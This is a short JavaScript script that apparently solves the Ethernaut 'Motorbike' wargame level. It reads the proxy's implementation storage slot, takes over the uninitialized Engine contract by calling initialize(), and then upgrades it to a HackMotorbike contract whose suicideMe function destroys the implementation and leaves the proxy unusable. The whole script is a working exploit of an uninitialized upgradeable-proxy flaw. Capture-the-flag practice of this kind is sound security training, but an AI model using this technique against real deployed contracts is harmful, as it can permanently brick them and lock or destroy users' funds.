module.exports = async function({ artifacts, web3, ethernaut }) {
  const Engine = artifacts.require('Engine');
  const HackMotorbike = artifacts.require('HackMotorbike');
  const instanceAddress = await ethernaut.createInstance(web3, 'Motorbike');
  console.log('Created instance at', instanceAddress);

  const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
  const engineAddress = await web3.eth.getStorageAt(instanceAddress, _IMPLEMENTATION_SLOT);
  const engineInstance = await Engine.at('0x' + web3.utils.stripHexPrefix(engineAddress).substring(24));
  const hackInstance = await HackMotorbike.new();

  await engineInstance.initialize();
  await engineInstance.upgradeToAndCall(hackInstance.address, web3.eth.abi.encodeFunctionCall({
    name: 'suicideMe',
	  type: 'function',
    inputs: []
  }, []));

  return ethernaut.submitInstance(web3, instanceAddress);
};